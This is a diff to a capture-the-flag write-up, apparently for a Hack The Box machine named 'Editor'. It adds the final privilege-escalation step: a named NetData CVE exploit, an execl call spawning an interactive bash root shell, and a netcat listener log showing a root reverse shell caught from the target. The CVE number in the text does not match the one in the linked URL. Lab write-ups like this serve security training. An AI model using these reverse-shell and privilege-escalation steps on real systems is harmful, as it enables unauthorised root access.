@@ -99,6 +99,17 @@ udp        0      0 127.0.0.53:53           0.0.0.0:*
 ```
 
 There are SQL servers, and `java` and `netdata` services exposed via certain ports. 
-To view the NetData dhasboard, I connect to it via `ssh` tunnel - `ssh -L 19999:127.0.0.1:19999 oliver@10.10.11.80` from my local machine. Then I can open the dashboard on my browser.
+To view the NetData dashboard, I connect to it via `ssh` tunnel - `ssh -L 19999:127.0.0.1:19999 oliver@10.10.11.80` from my local machine. Then I can open the dashboard on my browser.
 For these pentesting, we usually lookup the version and check if any CVE is present or not. So, I do the same and find **CVE-2024-3201**. [This GitHub](https://github.com/AliElKhatteb/CVE-2024-32019-POC) link provides with sample exploit.
 
+Using this exploit, we can get a reverse shell on our machine or just spawn a root shell on oliver using `execl("/bin/bash", "bash", "-i", NULL);`. 
+Now we will be a **root** user and we can access the root flag from `/root/root.txt`
+```                         
+┌──(truelyyours㉿kali)-[~/htb/editor]
+└─$ nc -nvlp 9001                                  
+listening on [any] 9001 ...
+connect to [10.10.16.16] from (UNKNOWN) [10.10.11.80] 58706
+root@editor:/home/oliver# 
+```
+
+Cheers! Treat yourself to a crips glass of god's nectar!
